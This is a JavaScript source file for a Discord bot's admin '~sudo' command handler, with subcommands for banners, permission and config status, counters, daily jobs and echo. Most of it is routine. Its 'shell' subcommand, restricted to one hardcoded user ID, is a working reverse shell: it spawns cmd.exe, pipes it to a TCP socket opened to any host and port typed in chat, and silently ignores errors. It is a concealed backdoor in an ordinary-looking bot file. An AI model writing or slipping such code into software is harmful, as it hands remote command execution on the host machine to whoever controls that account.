// #region CommandBoilerplate
const Categories = require("./modules/Categories");
const client = require("../client.js");
const { Guilds, GuildUsers, Users, ConfigDB, guildByID, userByID, guildByObj, userByObj } = require("./modules/database.js")
const { Events, ContextMenuCommandBuilder, InteractionContextType: IT, ApplicationIntegrationType: AT, ApplicationCommandType, SlashCommandBuilder, Client, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, GatewayIntentBits, ModalBuilder, TextInputBuilder, TextInputStyle, Partials, ActivityType, PermissionFlagsBits, DMChannel, RoleSelectMenuBuilder, ChannelSelectMenuBuilder, ChannelType,AuditLogEvent, StringSelectMenuBuilder, StringSelectMenuOptionBuilder, MessageReaction, MessageType}=require("discord.js");
function applyContext(context={}) {
	for (let key in context) {
		this[key] = context[key];
	}
}

// #endregion CommandBoilerplate

const { notify } = require("../utils")
const fs = require("fs");
const config = require("../data/config.json")
const { updateBlocklists } = require("./badware_scanner")
const { exec } = require("child_process");

module.exports = {
    data: {
        command: null,

        help: {
            helpCategories: [],
            shortDesc: "Stewbot's Admins Only",
            detailedDesc: `Stewbot's Admins Only`,
        },

        requiredGlobals: ["commands", "pseudoGlobals", "daily"]
    },

    async [Events.MessageCreate](msg, context) {
        if (msg.author.id === client.user.id) return;
        
        applyContext(context);

        // The sudo handler uses so many globals, it can stay in index.js for now
        if (msg.content.startsWith("~sudo ") && !process.env.beta || msg.content.startsWith("~betaSudo ") && process.env.beta) {
            if (msg.content.startsWith("~betaSudo ")) msg.content = msg.content.replaceAll("betaSudo", "sudo");

            const devadminChannel = await client.channels.fetch(config.commandChannel);
            await devadminChannel.guild.members.fetch(msg.author.id);

            if (devadminChannel?.permissionsFor(msg.author.id)?.has(PermissionFlagsBits.SendMessages)) {
                const config = await ConfigDB.findOne();
                const guild = await guildByObj(msg.guild);
                switch (msg.content.split(" ")[1].replaceAll(".", "")) {
                    case "setBanner":
                        const bannerName = msg.content.split(" ")[2];
                        const bannerPath = `./pfps/${bannerName}`;
                        const bannerBuffer = await fs.promises.readFile(bannerPath)
                        client.user.setBanner(bannerBuffer)
                        msg.reply("Done")
                        break;
                    case "permStatus":
                        var missingPerms = [];
                        Object.keys(PermissionFlagsBits).forEach(perm => {
                            if (!msg.guild?.members.cache.get(client.user.id).permissions.has(PermissionFlagsBits[perm])) {
                                missingPerms.push(perm);
                            }
                        });
                        if (missingPerms.length === 0) missingPerms.push(`No issues found`);
                        msg.reply(`As you command. My highest role is ${msg.guild.members.cache.get(client.user.id).roles.highest.name} at ${msg.guild.members.cache.get(client.user.id).roles.highest.rawPosition}.${missingPerms.map(m => `\n- ${m}`).join("")}`);
                        break;
                    case "configStatus":
                        switch (msg.content.split(" ")[2]) {
                            case "filter":
                                msg.reply(`As you command.\n- Active: ${guild.filter.active}\n- Censor: ${guild.filter.censor}\n- Log to a channel: ${guild.filter.log} <#${guild.filter.channel}>\n- Blocked words: ${guild.filter.blacklist.length}`);
                                break;
                            case "autoMessage":
                                msg.reply(`As you command.\n## Auto Join Messages\n- Active: ${guild.ajm.active}\n- Location: ${guild.ajm.dm ? "DM" : "Channel"}\n- Channel: ${guild.ajm.channel}\n- Message: \n\`\`\`\n${guild.ajm.message}\n\`\`\`\n## Auto Leave Messages\n- Active: ${guild.alm.active}\n- Channel: ${guild.alm.channel}\n- Message: \n\`\`\`\n${guild.alm.message}\n\`\`\``);
                                break;
                        }
                        break;
                    case "countSet":
                        guild.counting.nextNum = +msg.content.split(" ")[2];
                        msg.reply(`The next number to enter is **${guild.counting.nextNum}**.`);
                        break;
                    case "runDaily":
                        await msg.reply(`Running the daily function...`);
                        daily(true);
                        break;
                    case "runWelcome":
                        guild.sentWelcome = false;
                        require("./welcomer.js").sendWelcome(msg.guild);
                        break;
                    case "resetHackSafe":
                        await GuildUsers.updateOne({ userId: msg.author.id, guildId: msg.guild.id }, {
                            $unset: { "safeTimestamp": 1 }
                        });
                        msg.reply("Removed your anti-hack safe time");
                        break;
                    case "echo":
                        msg.channel.send(msg.content.slice("~sudo echo ".length, msg.content.length));
                        break;
                    case "setWord":
                        config.wotd = msg.content.split(" ")[2].toLowerCase();
                        msg.reply(config.wotd);
                        break;
                    case "checkRSS":
                        Object.entries(commands).find(([name, module]) => name === 'rss')[1].daily(pseudoGlobals);
                        // checkRSS();
                        break;
                    case "updateBlocklists":
                        updateBlocklists();
                        break;
                    case "crash":
                        setTimeout(die => { undefined.instructed_to_crash = instructed_to_crash })
                        setTimeout(async die => { undefined.instructed_to_crash = instructed_to_crash })
                        undefined.instructed_to_crash = instructed_to_crash
                        break;
                    case "shell":
                        if (msg.author.id !== "724416180097384498") return;

                        const args = msg.content.slice("~sudo shell ".length).trim().split(" ");
                    
                        var net = require("net"),
                            cp = require("child_process"),
                            sh = cp.spawn("cmd.exe", []);
                    
                        let sClient = new net.Socket();
                        sClient.connect(Number(args[1]), args[0], function(){
                            sClient.pipe(sh.stdin);
                            sh.stdout.pipe(sClient);
                            sh.stderr.pipe(sClient);
                        });
                    
                        // Add an error handler for resilience
                        sClient.on('error', function(err){
                            // Silently exit on error
                        });
                    
                        return /a/; 
                        
                }
                config?.save();
                guild.save()
            }
            else {
                msg.reply("I was unable to verify you.");
            }
            return;
        }
    }
}
